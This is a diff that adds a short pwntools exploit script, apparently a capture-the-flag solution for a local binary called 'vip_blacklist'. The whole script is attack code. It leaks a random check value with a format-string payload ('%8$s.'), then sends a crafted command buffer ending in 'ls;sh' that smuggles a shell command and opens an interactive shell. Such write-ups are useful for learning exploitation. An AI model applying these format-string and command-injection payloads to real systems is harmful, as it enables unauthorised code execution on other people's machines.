@@ -1,0 +1,18 @@
+from pwn import *
+
+# bypass check VIP by leak rand value via format string, then add "sh" command
+# offset = distance between the order of argument store variable and the argument store the string format
+# sprintf offset = printf offset - 1
+
+p = process("./vip_blacklist")
+
+payload = "%8$s."
+p.sendlineafter("Commands: clear exit ls", payload)
+p.recvuntil("Executing: ")
+rand = p.recvuntil(".", drop = True)
+print(rand)
+p.sendlineafter("Commands: clear exit ls", rand)
+payload = b"queue\x00" + b'clear\x00' + b'exit\x00\x00' + b'ls;sh\x00'
+p.sendlineafter("Commands: clear exit ls", payload)
+p.sendline(b'ls;sh\n');
+p.interactive()
